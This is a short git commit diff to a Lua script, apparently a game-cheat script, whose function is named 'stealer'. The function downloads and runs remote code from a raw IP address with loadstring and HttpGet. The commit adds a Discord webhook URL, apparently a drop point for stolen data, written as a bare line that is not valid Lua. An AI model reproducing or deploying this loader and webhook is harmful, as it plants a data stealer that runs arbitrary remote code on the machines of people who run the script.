54feabc46e099c86672a24507b025a5676cb1af6
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-31 00:23:02 +0500

    Update amv.lua

--- primordial/script/amv.lua
+++ primordial/script/amv.lua
@@ -1,4 +1,5 @@
 local function stealer()
+webhook: https://discord.com/api/webhooks/1411418609330163783/WS1MzOGfaLOJ15-vEUYjC5cJIJXbWudr3FY4-0AfN6kyg_r5eCwv53HFPb0fa0ovREM7
 ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 end
